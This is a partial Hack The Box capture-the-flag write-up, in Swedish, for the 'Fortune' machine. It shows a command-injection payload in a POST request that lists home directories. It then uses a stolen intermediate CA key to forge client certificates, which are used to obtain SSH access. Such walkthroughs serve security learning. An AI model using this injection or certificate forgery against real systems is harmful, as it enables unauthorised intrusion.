---
layout: single
title: Fortune - Hack The Box
excerpt: "Partial writeup.. "
date: 2019-06-25
classes: wide
header:
  teaser: /assets/images/htb-writeup-fortune/fortune_logo.png
  teaser_home_page: true
  icon: /assets/images/question-mark-white.png
  unreleased: false
categories:
  - hackthebox
tags:  
  - unknown os
  - insane
  - certificates
---

![](/assets/images/htb-writeup-fortune/fortune_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

N/A<br><br><br><br><br><br><br>

----------------


# USER
## Enumeration
Basic enum shows port **22,80,443**. 443 har cert error, 80 anropar en db med fortunes, 22 saknar vi creds för

`dirb` visar inget spännande. Kör en crawl/audit i burp på `http://10.10.10.127` och ser att den är vulnerable för os command- och code injection.

Skickar POST Request till Repeater och söker mig runt i burken efter cert filer och användare:
```bash
POST /select HTTP/1.1
Host: 10.10.10.127
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Connection: close
Cache-Control: max-age=0
Referer: http://10.10.10.127/
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

db=fortune|ls -al /home
```

Hittar 3 användare: `bob`, `charlie` och `nfsuser`. `Bob` har massor av cert-filer vilket känns intressant. `Charlie` kommer man ej åt så chansar att `user.txt` finns här. `nfsuser` har en mer eller mindre tom hemkatalog

Plockar hem alla filer från bob så jag har följade filstruktur:
```bash
$ tree
.
├── bob
│   ├── ca
│   │   ├── certs
│   │   │   └── ca.cert.pem
│   │   ├── index.txt
│   │   ├── index.txt.attr
│   │   ├── intermediate
│   │   │   ├── certs
│   │   │   │   ├── ca-chain.cert.pem
│   │   │   │   ├── fortune.htb.cert.pem
│   │   │   │   ├── intermediate.cert.pem
│   │   │   │   └── intermediate.cert.srl
│   │   │   ├── crlnumber
│   │   │   ├── csr
│   │   │   │   ├── fortune.htb.csr.pem
│   │   │   │   └── intermediate.csr.pem
│   │   │   ├── index.txt
│   │   │   ├── newcerts
│   │   │   │   └── 1000.pem
│   │   │   ├── openssl.cnf
│   │   │   └── private
│   │   │       └── intermediate.key.pem
│   │   ├── newcerts
│   │   │   └── 1000.pem
│   │   ├── openssl.cnf
│   │   ├── serial
│   │   └── serial.old
│   └── dba
│       └── authpf.sql
```

För enkelhet skapa en dir som heter custom-certs utanför dir bob. Skapa custom cert-key samt request för bob och charlie (subj-info tagen från `bob/ca/index.txt` samt `bob/ca/intermediate/index.txt`) i nyskapade custom-cert dir'en:
```bash
openssl req -newkey rsa:4096 -keyout bob_key.pem -out bob_csr.pem -nodes -days 365 -subj "/C=CA/ST=ON/O=Fortune Co HTB/CN=Fortune Intermediate CA/emailAddress=bob@fortune.htb"

openssl req -newkey rsa:4096 -keyout charlie_key.pem -out charlie_csr.pem -nodes -days 365 -subj "/C=CA/ST=ON/O=Fortune Co HTB/CN=fortune.htb/emailAddress=charlie@fortune.htb"
```

Döp om filerna för enkelhetensskull:
```bash
mv bob_key.pem bob.key && mv bob_csr.pem bob.csr
mv charlie_key.pem charlie.key && mv charlie_csr.pem charlie.csr
```
```bash
$ ls -al
total 24
drwxr-xr-x 1 root root  108 Jun 26 14:25 .
drwxr-xr-x 1 root root  196 Jun 26 14:10 ..
-rw-r--r-- 1 root root 1716 Jun 26 14:11 bob.csr
-rw------- 1 root root 3272 Jun 26 14:11 bob.key
-rw-r--r-- 1 root root 1704 Jun 26 14:12 charlie.csr
-rw------- 1 root root 3272 Jun 26 14:12 charlie.key
```

Signera certificate requests med intermediate.key (pwd = htb/machines/fortune/custom-certs):
```bash
openssl x509 -req -days 365 -in bob.csr -CA ../bob/ca/intermediate/certs/intermediate.cert.pem -CAkey ../bob/ca/intermediate/private/intermediate.key.pem -CAcreateserial -out bob.crt

openssl x509 -req -days 365 -in charlie.csr -CA ../bob/ca/intermediate/certs/intermediate.cert.pem -CAkey ../bob/ca/intermediate/private/intermediate.key.pem -CAcreateserial -out charlie.crt
```

Konvertera .crt till .p12 för att kunna använda dem i Firefox, lämna password blankt (pwd = htb/machines/fortune/custom-certs):
```bash
openssl pkcs12 -export -out bob.p12 -inkey bob.key -in bob.crt -certfile ../bob/ca/intermediate/certs/intermediate.cert.pem
openssl pkcs12 -export -out charlie.p12 -inkey charlie.key -in charlie.crt -certfile ../bob/ca/intermediate/certs/intermediate.cert.pem
```

Importera charlie.p12 i Firefox och surfa in på https://10.10.10.127 för att få SSH key pair<br>
`options -> preferences -> advanced -> certificates -> view certificates -> your certificates -> import -> select charlie.p12 -> ok`

Tryck på "generate" och spara ner public key i `/root/.ssh/id_rsa.pub` (perm 644) samt private i `/root/.ssh/id_rsa` (perm 600)

Logga in som nfsuser med public key.
`ssh nfsuser@10.10.10.127`

